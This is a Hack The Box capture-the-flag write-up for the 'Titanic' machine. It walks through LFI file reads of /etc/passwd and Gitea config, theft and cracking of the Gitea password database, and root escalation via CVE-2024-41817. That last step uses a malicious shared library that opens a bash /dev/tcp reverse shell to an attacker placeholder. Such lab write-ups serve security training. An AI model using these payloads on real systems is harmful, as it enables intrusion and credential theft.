Author: Faridd

### HTB Write-Up: Titanic

| Field      | Details                                                          |
|------------|------------------------------------------------------------------|
| Platform   | [Hack The Box](https://app.hackthebox.com/machines/Titanic)      |
| Difficulty | Easy                                                              |
| OS         | Linux                                                             |
| Date       | November 02, 2026                                                 |

---

#### Table of Contents
1. [Reconnaissance — Rustscan & Subdomain/Directory Enumeration](#1-reconnaissance--rustscan--subdomaindirectory-enumeration)
2. [Enumeration — Local File Inclusion via the Ticket Download Endpoint](#2-enumeration--local-file-inclusion-via-the-ticket-download-endpoint)
3. [Initial Access — Gitea Config Leak, Database Theft & Hash Cracking](#3-initial-access--gitea-config-leak-database-theft--hash-cracking)
4. [Privilege Escalation — CVE-2024-41817 ImageMagick Shared Library Hijacking](#4-privilege-escalation--cve-2024-41817-imagemagick-shared-library-hijacking)

---

#### 1. Reconnaissance — Rustscan & Subdomain/Directory Enumeration

Port discovery was performed with **Rustscan**:

```bash
rustscan -a 10.129.231.221 --ulimit=5000
```

**Open Ports:**

```
Open 10.129.231.221:22
Open 10.129.231.221:80
```

Only SSH and HTTP are exposed, so the host name was added to `/etc/hosts` to enable virtual-host based enumeration:

```bash
echo "10.129.231.221 titanic.htb" | sudo tee -a /etc/hosts
```

##### 1.1 — Subdomain Enumeration

```bash
ffuf -H "Host: FUZZ.titanic.htb" -u "http://titanic.htb" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -ic -fw 20
```

**Result:**

```
dev                     [Status: 200, Size: 13982, Words: 1107, Lines: 276, Duration: 168ms]
```

A `dev` subdomain was identified: `dev.titanic.htb`.

##### 1.2 — Directory Enumeration (Subdomain & Root Domain)

```bash
ffuf -u "http://dev.titanic.htb/FUZZ" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt -ic -fw 20 -e .php,.txt
```

**Result:**

```
developer               [Status: 200, Size: 25151, Words: 2139, Lines: 506, Duration: 176ms]
v2                      [Status: 401, Size: 50, Words: 1, Lines: 2, Duration: 581ms]
administrator           [Status: 200, Size: 19997, Words: 1619, Lines: 417, Duration: 213ms]
```

```bash
ffuf -u "http://titanic.htb/FUZZ" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt -ic -fw 20 -e .php,.txt
```

**Result:**

```
book                    [Status: 405, Size: 153, Words: 16, Lines: 6, Duration: 182ms]
```

The main domain exposes a `book` endpoint, and the `dev` subdomain exposes `developer` and an unauthenticated-but-401 `administrator` path — both worth deeper investigation.

---

#### 2. Enumeration — Local File Inclusion via the Ticket Download Endpoint

On the root domain, submitting a booking triggers a file download via a `ticket` parameter:

```http
GET /download?ticket=9bc23f5f-814f-4ab1-a4ca-4d42a254accb.json HTTP/1.1
Host: titanic.htb
```

**Response:**

```json
{"name": "aaa", "email": "aarlos@carlos-montoya.net", "phone": "121212121", "date": "1111-11-11", "cabin": "Deluxe"}
```

The `ticket` parameter takes a filename and returns its contents directly, which is a strong indicator of a Local File Inclusion (LFI) vulnerability. This was tested by substituting a known system file:

```http
GET /download?ticket=/etc/passwd HTTP/1.1
Host: titanic.htb
```

**Response:**

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
```

The endpoint has no path restriction — arbitrary files on the server can be read through it. This LFI is the foothold for everything that follows.

---

#### 3. Initial Access — Gitea Config Leak, Database Theft & Hash Cracking

##### 3.1 — Locating Docker Compose Files

The `developer` endpoint on `dev.titanic.htb` exposed two Docker Compose files, revealing that the box runs **Gitea** and **MySQL** in containers:

```
docker-config/gitea/docker-compose.yml
docker-config/mysql/docker-compose.yml
```

The Gitea compose file revealed its data volume path, `/home/developer/gitea/data`, and the MySQL compose file leaked database credentials (root password, `tickets` database, and a `sql_svc` user) — though the database credentials were not what ultimately mattered, since Gitea itself turned out to be backed by SQLite rather than that MySQL instance.

##### 3.2 — Locating and Reading Gitea's Config via LFI

Since LFI access to the filesystem was already available, the next step was to find Gitea's configuration file (`app.ini`) to determine how its database was set up. Known locations for a Dockerized Gitea install include `/etc/gitea/app.ini` and `/data/gitea/conf/app.ini`. Combining the leaked data path from the compose file with Gitea's standard internal layout pointed to:

```
/download?ticket=/home/developer/gitea/data/gitea/conf/app.ini
```

**Relevant config contents:**

```ini
[database]
PATH = /data/gitea/gitea.db
DB_TYPE = sqlite3
HOST = localhost:3306
NAME = gitea
USER = root
PASSWD = 
LOG_SQL = false
SCHEMA = 
SSL_MODE = disable

[security]
INSTALL_LOCK = true
SECRET_KEY = 
REVERSE_PROXY_LIMIT = 1
REVERSE_PROXY_TRUSTED_PROXIES = *
INTERNAL_TOKEN = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYmYiOjE3MjI1OTUzMzR9.X4rYDGhkWTZKFfnjgES5r2rFRpu_GXTdQ65456XC0X8
PASSWORD_HASH_ALGO = pbkdf2
```

This confirmed Gitea is backed by a local **SQLite** database at `/data/gitea/gitea.db`, and that passwords are hashed with **PBKDF2**.

##### 3.3 — Exfiltrating the SQLite Database via LFI

The same technique was used again, this time to fetch the actual database file through the LFI:

```bash
curl 'http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db' -o gitea.db
```

##### 3.4 — Extracting User Hashes

```bash
sqlite3 gitea.db
sqlite> SELECT * FROM user;
```

**Result (trimmed to relevant fields):**

```
1|administrator|...|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|pbkdf2$50000$50|...
2|developer|...|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|pbkdf2$50000$50|...
```

Two user hashes were recovered, `administrator` and `developer`, both PBKDF2 with a stored salt — not directly crackable with Hashcat without reformatting.

##### 3.5 — Converting PBKDF2 Hashes to Hashcat Format

Gitea's PBKDF2 output needs the salt and hash combined into a Hashcat-compatible format. The community tool `gitea2hashcat.py` handles this conversion:

```bash
sqlite3 gitea.db 'select salt,passwd from user;' | python3 gitea2hashcat.py
```

**Output:**

```
sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY=
sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
```

##### 3.6 — Cracking with Hashcat

```bash
hashcat -m 10900 hash /usr/share/wordlists/rockyou.txt
```

**Result:**

```
sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528
```

The `developer` account's password was cracked: **`25282528`**.

##### 3.7 — SSH Access & User Flag

```bash
ssh developer@10.129.231.221
```

```bash
developer@titanic:~$ cat user.txt
a03dfd6bb367c7c1b3cc639f8871882d
```

---

#### 4. Privilege Escalation — CVE-2024-41817 ImageMagick Shared Library Hijacking

##### 4.1 — Discovering the Vulnerable Script

An automated image-processing script, `identify_images.sh`, was found running under `/opt/scripts/`:

```bash
cat identify_images.sh
```

```bash
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

The script changes into `/opt/app/static/assets/images` — a directory writable by the low-privileged `developer` user — before invoking `magick`. The installed ImageMagick version was checked:

```bash
/usr/bin/magick --version
```

```
Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713
```

This version is affected by **CVE-2024-41817**, an uncontrolled search path vulnerability in ImageMagick's AppImage wrapper. In the AppImage initialization logic, failed environment-variable lookups (`LD_LIBRARY_PATH`, `MAGICK_CONFIGURE_PATH`) append an empty path element instead of failing safely. On Linux, an empty path element in a library search path is treated as the current working directory — so because the script `cd`s into an attacker-writable folder before running `magick`, a malicious shared library dropped there will be loaded ahead of the legitimate system library, giving code execution as whichever user runs the script (here, root via a cron/background job).

The specific library targeted was `libxcb.so.1`, which ImageMagick loads at startup.

##### 4.2 — Setting Up a Listener

```bash
nc -nvlp 4444
```

##### 4.3 — Building the Malicious Shared Library

A constructor function was used so the payload executes automatically as soon as the library is loaded, with no need to call a specific function:

```bash
cd /tmp
cat << 'EOF' > payload.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'");
    exit(0);
}
EOF
```

##### 4.4 — Compiling the Payload as libxcb.so.1

```bash
gcc -x c -shared -fPIC -o ./libxcb.so.1 payload.c
```

##### 4.5 — Dropping the Payload in the Script's Working Directory

```bash
cp ./libxcb.so.1 /opt/app/static/assets/images/
touch /opt/app/static/assets/images/trigger.jpg
```

A dummy `.jpg` was touched to make sure the script's `find`/`magick identify` loop had something to process, triggering `magick` to run in that directory on its next scheduled pass — and with it, the hijacked library.

##### 4.6 — Root Shell & Root Flag

```bash
nc -lvnp 4444
```

```
connect to [10.10.14.25] from (UNKNOWN) [10.129.231.221] 43628
root@titanic:/opt/app/static/assets/images# cd /root/
root@titanic:~# cat root.txt
dde3125f4b3d0d27484bb0ce56f65a58
```
